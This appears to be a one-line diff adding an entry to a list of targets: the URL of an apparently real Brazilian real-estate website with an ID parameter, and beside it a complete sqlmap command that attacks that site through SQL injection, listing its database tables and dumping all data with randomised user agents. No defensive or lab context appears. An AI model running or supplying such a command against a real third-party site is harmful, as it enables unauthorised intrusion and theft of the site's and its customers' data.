@@ -1,0 +1,1 @@
+http://www.imobiliariarainhadacastelo.com.br/imoveis_detalhe.php?ID=2096 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u http://www.imobiliariarainhadacastelo.com.br/imoveis_detalhe.php?ID=2096 -D INFORMATION_SCHEMA --tables --dump-all
